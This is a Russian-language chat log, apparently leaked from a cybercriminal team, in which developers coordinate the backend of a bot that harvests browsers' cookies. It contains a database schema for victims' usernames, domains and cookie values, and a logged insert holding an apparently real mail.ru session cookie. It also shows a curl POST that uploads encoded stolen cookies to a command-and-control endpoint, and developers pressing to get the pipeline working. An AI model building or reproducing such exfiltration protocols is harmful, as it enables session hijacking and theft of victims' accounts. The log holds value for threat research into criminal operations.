Timestamp	From	To	Message
2021-08-31 08:58:38.142487	ttrr	defender	вот . не может басе64 декодировать
2021-08-31 08:58:42.754674	ttrr	defender	не знаю какое поле
2021-08-31 08:59:10.713149	ttrr	defender	крашей больше нет
2021-08-31 08:59:29.607501	ttrr	defender	всмысли тех что хттп2
2021-08-31 09:05:10.043465	ttrr	defender	Это старые данные. Сейчас модуль отправляет Username, Domain, Cookie_name, Cookie_value, Path  в В64
2021-08-31 09:05:45.411146	ttrr	defender	[ Group, IdLow, IdHigh, base64:decode(Username), Browser, Domain, base64:decode(Cookie_name), base64:decode(Cookie_value), Created, Expires, base64:decode(Path) ]);

вот 4 поля декодируются только
2021-08-31 09:05:49.214683	ttrr	defender	надо все ?
2021-08-31 09:07:35.427134	ttrr	defender	Нужно домен ещё декодировать
2021-08-31 09:08:11.256023	ttrr	defender	ок .. добавил в новых версиях .
2021-08-31 09:09:24.730497	ttrr	defender	<<"INSERT INTO data84 (created_at, \"group\", id_low, id_high, username, browser, \"domain\", cookie_name, cookie_value, created, expires, path ) VALUES ( now(), $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11 )">> [<<"tot138">>,4268354464764256071,-5531770838041019469,<<149,166,247>>,<<"Firefox">>,<<".mail.ru">>,<<"mrcu">>,<<"14B45890605336B122FB29388502">>,<<"1399543312">>,<<"1714903312">>,<<"/">>]
2021-08-31 11:52:59.108 [error] <0.6879.3>@db:transform:58 Error {error,error,<<"22021">>,<<"invalid byte sequence for encoding \"UTF8\": 0x95">>,[]} with query {<<"INSERT INTO data84 (created_at, \"group\", id_low, id_high, username, browser, \"domain\", cookie_name, cookie_value, created, expires, path ) VALUES ( now(), $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11 )">>,[<<"tot138">>,4268354464764256071,-5531770838041019469,<<149,166,247>>,<<"Firefox">>,<<".mail.ru">>,<<"mrcu">>,<<"14B45890605336B122FB29388502">>,<<"1399543312">>,<<"1714903312">>,<<"/">>]}

есть еще такое
2021-08-31 09:09:32.432487	ttrr	defender	на УТФ-8 не походит кодировка
2021-08-31 09:09:59.454449	ttrr	defender	И ещё нужно 2 поля добавить в конец записи.
secure, httponly
Значения: 0 & 1
2021-08-31 09:10:00.429096	ttrr	defender	насколько я понимаю это про <<149,166,247>>
2021-08-31 09:10:26.178326	ttrr	defender	в таблицу колонки ?
2021-08-31 09:10:55.307271	ttrr	defender	Да, в запись поле, в таблицу колонки.
2021-08-31 09:11:43.256889	ttrr	defender	А юникод в каком поле не проходит?
2021-08-31 09:20:09.639586	ttrr	defender	,<<149,166,247>> я думаю вот это не может быть юникодом
2021-08-31 09:20:45.226170	ttrr	defender	юзернейм
2021-08-31 09:22:08.343290	ttrr	defender	Похоже, пользователь. Скорее всего модуль не отправляет UTF8. Нужно проверить.
А ты можешь в readme этот формат добавить + описание ошибок?
Мы уже много времени потратили на поиск этих ошибок из-за отсутствия описания протокола обмена.
2021-08-31 09:23:06.134565	ttrr	defender	формат чего ?
2021-08-31 09:23:49.261348	ttrr	defender	в каталог doc есть некоторое описалово
2021-08-31 09:23:54.884028	ttrr	defender	Кукисов, например. Ещё бы хорошо остальные данные проверить.
2021-08-31 09:24:07.886080	ttrr	defender	Там кукисы описаны?
2021-08-31 09:24:16.334757	ttrr	defender	какие кукисы ?
2021-08-31 09:24:39.285701	ttrr	defender	Куки, печенюшки
2021-08-31 09:24:57.064274	ttrr	defender	я понял что такое куки, но к чему ты это говоришь ?
2021-08-31 09:25:05.869960	ttrr	defender	1. Создать новую команду для получения данных куки. Например, код команды 84

2. Создать таблицу для хранения данных (псевдокод SQL):
CREATE TABLE cookies (
  id SERIAL,
  username VARCHAR(255),
  browser VARCHAR(255)
  domain VARCHAR(255)
  cookie_name VARCHAR(255)
  cookie_value VARCHAR(255)
  created DATETIME,
  expires DATETIME,
  path VARCHAR(255)
);

3. Обеспечить прием данных в следующем формате:
- простой текст, разделенный на строки.
Разделитель строк - может быть как UNIX, так и DOS.
Одна строка - одна запись.
Разделитель полей в записи - вертикальная черта |
Формат записи:

username|browser|domain|cookie_name|cookie_value|created|expires|path\r\n

где

username     - имя пользователя
browser      - код броузера (enum = chrome|ff|ie|edge)
domain       - домен куки
cookie_name  - имя куки
cookie_value - значение куки
created      - дата-время создания, Unix time
expires      - дата-время истечения, Unix time
path         - путь URI
2021-08-31 09:26:49.565737	ttrr	defender	К тому, что у меня не было этого дока. Где описание В64? Это часть формата.
2021-08-31 09:28:37.306277	ttrr	defender	нету про базе64 .. сами добавили очевидно
2021-08-31 09:28:51.257365	ttrr	defender	чтобы экранировать символы
2021-08-31 09:29:50.576629	ttrr	defender	Ну, вот это и нужно в доку добавить.
created у нас в секундах?
2021-08-31 09:30:27.366813	ttrr	defender	created_at я ставлю сам как NOW()
2021-08-31 09:30:36.634794	ttrr	defender	Не догадываться же, как там отстойник обрабатывает, верно?
2021-08-31 09:31:00.358719	ttrr	defender	а .есть другой ..
2021-08-31 09:31:02.578667	ttrr	defender	щас посмотрю
2021-08-31 09:31:21.647778	ttrr	defender	А NOW() в секундах?
2021-08-31 09:32:35.414119	ttrr	defender	забей на NOW() это другое
2021-08-31 09:36:27.495035	ttrr	defender	CREATE TABLE public.data84 (
    id_low bigint NOT NULL,
    id_high bigint NOT NULL,
    "group" character varying(64),
    created_at timestamp without time zone,
    username text,
    browser text,
    domain text,
    cookie_name text,
    cookie_value text,
    created text,
    expires text,
    path text
);
2021-08-31 09:36:31.361021	ttrr	defender	вот таблица
2021-08-31 09:36:37.402817	ttrr	defender	created - просто текст
2021-08-31 09:36:41.644193	ttrr	defender	нету про базе64 .. сами добавили очевидно 
Ну, не для всех очевидно ) У нас каждый своей частью работы занимается, кто там что правит - зачастую неизвестно.
2021-08-31 09:36:43.346981	ttrr	defender	всё - просто текст
2021-08-31 09:37:34.039310	ttrr	defender	> У нас каждый своей частью работы занимается, кто там что правит - зачастую неизвестно.  
очевидно не я один это добавлял и не только на моей стороне, иначе не работало бы.
коду уже 5 лет
2021-08-31 09:39:30.948145	ttrr	defender	Ну, это тоже не очевидно)
По факту ошибки посыпались. Документация не полная.
2021-08-31 09:41:31.312828	ttrr	defender	где же ты был )
2021-08-31 10:40:22.320570	ttrr	defender	Zulas ты под новые поля базу тоже будешь менять?
Если да то просьба этого не делать, я веду миграции и хотелось бы чтобы все изменения в базе в них были отражены.
2021-08-31 10:40:58.852141	ttrr	defender	Я написал миграции под два поля secure и httponly
2021-08-31 10:41:19.038272	ttrr	defender	Оба логических.
2021-08-31 10:41:50.950363	ttrr	defender	не буду делать .
2021-08-31 10:41:53.237265	ttrr	defender	и в 90 команду добавились новые поля
2021-08-31 10:42:06.306021	ttrr	defender	ты базу на рабочем уже поменял ?я могу слить дамп ?
2021-08-31 10:42:24.069299	ttrr	defender	поля не будут сохраняться, если их больше?
2021-08-31 10:42:41.758287	ttrr	defender	dlls, programs, services Я тоже уже добавил
2021-08-31 10:42:55.647194	ttrr	defender	а, ок
2021-08-31 10:42:55.698034	ttrr	defender	Пока не накатил, сек сделаю
2021-08-31 10:44:25.981563	ttrr	defender	Там поле под ярлыки desktop нужно еще, но пока не добавил его в миграцию.
2021-08-31 10:44:38.107805	ttrr	defender	И в бэке его тоже вроде как нет
2021-08-31 10:44:40.984539	ttrr	defender	добавляй сразу всё чтобы мне не возвращаться
2021-08-31 10:46:16.068337	ttrr	defender	Пока не смогу. Ближе к вечеру время появится.
Там нужно в других частях это поле добавлять, поэтому быстро не смогу сделать.
2021-08-31 11:01:29.510353	ttrr	defender	По 2м полям в куках накатил миграции.
2021-08-31 14:33:07.582183	ttrr	defender	такой вопрос есть. Из за чего может быть такое, что я делаю запрос, бэк мне отвечает /1/ но в логах уровня info запроса нет, при этом в базе тех данных, которые я передал тоже нет. 
В бэке написано что /1/ это всегда про ответ 200, но я заметил что он отвечает /1/ и если бот есть в базе, и если его нет.
2021-08-31 14:34:45.524603	ttrr	defender	хороший вопрос, но зуласа нету в конфе уже
2021-08-31 14:34:50.756601	ttrr	defender	потому повтори этот вопрос как он появится
2021-08-31 14:35:16.318691	ttrr	defender	Оке, тут получается нет истории..
2021-08-31 14:35:52.754515	ttrr	defender	неа
2021-08-31 15:23:57.159786	defender	ttrr	для того чтобы не заходить постоянно в конфу после релогина вверху есть звездочка, нажмите 2 раза и выберите автовход - всегда
2021-08-31 15:23:57.161644	ttrr	defender	для того чтобы не заходить постоянно в конфу после релогина вверху есть звездочка, нажмите 2 раза и выберите автовход - всегда
2021-08-31 15:24:14.675069	defender	ttrr	потом когда конфа будет не актуальна звездочку снимите
2021-08-31 15:24:14.676548	ttrr	defender	потом когда конфа будет не актуальна звездочку снимите
2021-09-01 05:41:44.673769	ttrr	defender	 > такой вопрос есть. Из за чего может быть такое, что я делаю запрос, бэк мне отвечает /1/ но в логах уровня info запроса нет, при этом в базе тех данных, которые я передал тоже нет. 
В бэке написано что /1/ это всегда про ответ 200, но я заметил что он отвечает /1/ и если бот есть в базе, и если его нет.

для начала что за запрос ? можем мы его повторить на текущей системе чтобы я его видел ?
2021-09-01 06:33:17.312607	ttrr	defender	oad
2021-09-01 13:51:45.506509	ttrr	defender	К сожалению не можем.
Если с этим серверм будет такое же история я напишу
2021-09-01 13:52:07.165112	ttrr	defender	Как повторить к сожалению не знаю пока
2021-09-02 11:28:45.757349	defender	ttrr	всем привет
2021-09-02 11:28:45.759906	ttrr	defender	всем привет
2021-09-02 11:28:50.923026	defender	ttrr	как дела с деро?
2021-09-02 11:28:50.924121	ttrr	defender	как дела с деро?
2021-09-02 11:29:03.152818	defender	ttrr	zulas: понятна проблема?
2021-09-02 11:29:03.155545	ttrr	defender	zulas: понятна проблема?
2021-09-02 11:30:43.882744	ttrr	defender	деф . привет .. а в чем проблема ?
2021-09-02 11:33:13.541684	defender	ttrr	driver: отпиши что ты мне написал сюда
2021-09-02 11:33:13.543622	ttrr	defender	driver: отпиши что ты мне написал сюда
2021-09-02 11:33:20.361151	defender	ttrr	ответ 403 был
2021-09-02 11:33:20.362898	ttrr	defender	ответ 403 был
2021-09-02 11:33:26.015033	defender	ttrr	с ним разобрались?
2021-09-02 11:33:26.026282	ttrr	defender	с ним разобрались?
2021-09-02 11:36:33.217378	ttrr	defender	Бэк отвечает 403 на попытку отправить куки.
2021-09-02 11:36:55.083153	ttrr	defender	Внесли ли изменения связанные с новыми полями?
2021-09-02 11:38:21.041876	defender	ttrr	давайте конкретно: кто и что должен внести?
2021-09-02 11:38:21.044002	ttrr	defender	давайте конкретно: кто и что должен внести?
2021-09-02 11:38:32.051141	defender	ttrr	тк походу зулас даже не в курсе
2021-09-02 11:38:32.052719	ttrr	defender	тк походу зулас даже не в курсе
2021-09-02 11:39:06.176087	defender	ttrr	4ый день мы тут что то обсуждаем, а в итоге ничего не делаем
2021-09-02 11:39:06.178820	ttrr	defender	4ый день мы тут что то обсуждаем, а в итоге ничего не делаем
2021-09-02 11:39:10.283169	defender	ttrr	в чем проблема?
2021-09-02 11:39:10.283820	ttrr	defender	в чем проблема?
2021-09-02 11:39:34.329106	ttrr	defender	Нужно в 84 команду внести 2 поля.
secure, httponly в конец приема, получается 9 и 10 поле должно быть.
2021-09-02 11:39:51.360366	ttrr	defender	В базу должны записываться поля с такими же именами
2021-09-02 11:41:12.878830	ttrr	defender	я ничего не вносил пока ..
2021-09-02 11:41:48.447933	ttrr	defender	так уже пора внести
2021-09-02 11:41:53.194417	ttrr	defender	драйвер же просил
2021-09-02 11:42:05.654301	ttrr	defender	у нас доработка прямо сейчас в модуле сбора, требует этого
2021-09-02 11:42:10.206567	ttrr	defender	Ок. Когда?
2021-09-02 11:43:37.294119	ttrr	defender	Я не стал этого делать потому что мне сказали, что сейчас zulas занимается бэком, но я напрямую не писал задачу.
Возможно решил что вы с кодером модуля обсудили этот момент
2021-09-02 11:44:33.236742	ttrr	defender	(31.08.2021 13:44:35) zulas: добавляй сразу всё чтобы мне не возвращаться
(31.08.2021 13:46:11) driver: Пока не смогу. Ближе к вечеру время появится.
Там нужно в других частях это поле добавлять, поэтому быстро не смогу сделать.
(31.08.2021 14:01:24) driver: По 2м полям в куках накатил миграции.
2021-09-02 11:44:45.183947	ttrr	defender	ну вообще надо все сразу сделать и чтобы не возвращаться
2021-09-02 11:44:52.284559	ttrr	defender	переключение контекста -- очень тяжелая операция )
2021-09-02 11:45:14.306425	ttrr	defender	так что 
1. я жду когда в базу нужное внесется
2. когда мне будет объяснено что нужно делать
2021-09-02 11:59:16.910566	ttrr	defender	так а по-моему driver говорил что накатил миграции на базу. Это не оно?
цитату не приведу, уплыло в истории
2021-09-02 12:03:26.091997	ttrr	defender	driver: поясни мне чего ты ждешь?
2021-09-02 12:03:33.363744	ttrr	defender	что нужно от зуласа?
2021-09-02 12:11:37.698547	ttrr	defender	Дело в том что миграция по десктопу относится к другой задаче.
2021-09-02 12:11:51.013999	ttrr	defender	Сейчас нужно сделать 2 этих поля
2021-09-02 12:12:18.868609	ttrr	defender	zulas: сделаешь?
2021-09-02 12:14:06.096712	ttrr	defender	Более того к другой команде и к другой таблице.
2021-09-02 12:15:43.895305	ttrr	defender	@driver давай конкретно что тебе надо и куда ... ок ?
2021-09-02 12:17:36.621722	ttrr	defender	Нужно в 84 команду внести 2 поля.
secure, httponly в конец приема, получается 9 и 10 поле должно быть.
2021-09-02 12:18:22.061065	ttrr	defender	На запрос вида 
curl -X POST -F 'data=dXNlcg==|IE||||1240428288|1240428288|dXNlcg==|IE|demdex.net|ZGVtZGV4|NTczODQzMjMyMTAwNDg1MDEyMDI3NjIxMTIxODA0ODI1OTMyMjQ=|1240428358|1240428358|Lw==|1|1' http://(IP)/TAG/TEST_W639600.1234A242341C6D1A25B3F315D688968E/84/
Должно ответить /1/
2021-09-02 12:20:09.144846	ttrr	defender	ок .. сейчас в базе поля уже есть ?
2021-09-02 12:20:19.948898	ttrr	defender	Да
2021-09-02 12:28:19.570136	ttrr	defender	а старые клиенты еще работают ?
2021-09-02 12:28:40.296322	ttrr	defender	т.е. надо поддерживать и старый формат и новый ?
2021-09-02 12:29:44.531925	ttrr	defender	Нет, просто только новый должен начать работать.
2021-09-02 12:30:37.242016	ttrr	defender	Уже внесли нужные изменения для клиентов. Ждем именно чтобы подхватило эти изменения часть по бэку
2021-09-02 12:59:04.941272	defender	ttrr	zulas: очень прошу поторопиться, так как сейчас от тебя зависит работа многих, без правок бекенда не можем дальше двинуться
2021-09-02 12:59:04.943580	ttrr	defender	zulas: очень прошу поторопиться, так как сейчас от тебя зависит работа многих, без правок бекенда не можем дальше двинуться
2021-09-02 13:03:56.539253	ttrr	defender	хорошо сделаю
2021-09-02 13:23:09.881355	ttrr	defender	[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path, Secure, HttpOnly ]
2021-09-02 13:23:13.463009	ttrr	defender	такая последовательность ?
2021-09-02 13:23:20.882606	ttrr	defender	@driver
2021-09-02 13:26:57.392704	ttrr	defender	@defender как мне запушить изменения ?
2021-09-02 13:37:09.260603	ttrr	defender	Да все верно.
2021-09-02 14:18:44.634039	defender	ttrr	zulas: а я тебе вроде выдавал доступ, разве нет?
2021-09-02 14:18:44.635291	ttrr	defender	zulas: а я тебе вроде выдавал доступ, разве нет?
2021-09-02 16:43:17.462026	ttrr	defender	я его 100 раз забыл
2021-09-02 16:43:37.841006	ttrr	defender	~/erl/dero> git -c credential.helper=/usr/share/smartgit/lib/credentials.sh push --porcelain --progress --recurse-submodules=check origin refs/heads/master:refs/heads/master
unable to access 'https://179.43.147.243/begemot/dero.git/': gnutls_handshake() failed: Internal error
2021-09-02 16:44:19.024032	defender	ttrr	ок, щас в личку кину
2021-09-02 16:44:19.025270	ttrr	defender	ок, щас в личку кину
2021-09-03 09:27:34.709846	ttrr	defender	Добрый день! Как успехи по пушу кода?
2021-09-03 09:28:03.395986	ttrr	defender	@zulas @defender
2021-09-03 09:28:22.264709	ttrr	defender	надо запушить . жду дефа
2021-09-03 09:31:17.966911	ttrr	defender	Ок
2021-09-03 11:49:56.197033	ttrr	defender	А есть вариант просто на сервер залить этот код пока что?
2021-09-03 11:50:22.704406	ttrr	defender	Чтобы мы потестили, а с гитом позже разобраться7
2021-09-03 11:57:50.001700	defender	ttrr	зулас запушил
2021-09-03 11:57:50.003568	ttrr	defender	зулас запушил
2021-09-03 11:57:56.216523	defender	ttrr	я его попросил выгрузить на сервер
2021-09-03 11:57:56.217507	ttrr	defender	я его попросил выгрузить на сервер
2021-09-03 11:58:32.834690	defender	ttrr	 driver или ты выгрузи сам
2021-09-03 11:58:32.836363	ttrr	defender	 driver или ты выгрузи сам
2021-09-03 12:17:17.909945	ttrr	defender	Ок
2021-09-03 12:17:26.286983	ttrr	defender	Выгружу.
2021-09-03 12:54:25.745267	ttrr	defender	SQL = "INSERT INTO data84 (created_at, \"group\", id_low, id_high, username, browser, \"domain\", cookie_name, cookie_value, created, expires, path ) VALUES ( NOW(), $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13 )",
2021-09-03 12:55:03.220705	ttrr	defender	@zulas не вставил 2 поля в запрос в базу.
2021-09-03 12:55:17.837474	ttrr	defender	Поправь пожалуйста.
2021-09-03 13:02:44.309362	ttrr	defender	И таблицу архива куков, там тоже эти 2 поля нужны будут.
2021-09-03 13:03:34.027532	ttrr	defender	По остальному посмотрел, вижу схему нормальную сделал, все ок. Это у нас недавно было актуальной проблемой.
2021-09-03 13:04:19.044728	ttrr	defender	cookies_archive*
2021-09-03 13:23:45.181934	ttrr	defender	zulas отпиши по времени, когда сможешь сделать фиксы
2021-09-03 13:44:34.795816	ttrr	defender	щас посмотрю
2021-09-03 13:46:05.458181	ttrr	defender	@driver cookies_archive* .. я такой таблицей не пользуюсь
2021-09-03 13:56:14.444667	ttrr	defender	пофиксил запрос
2021-09-03 13:56:17.183368	ttrr	defender	не тестировал
2021-09-04 06:50:20.177709	ttrr	defender	сегодня отдых у всех ?
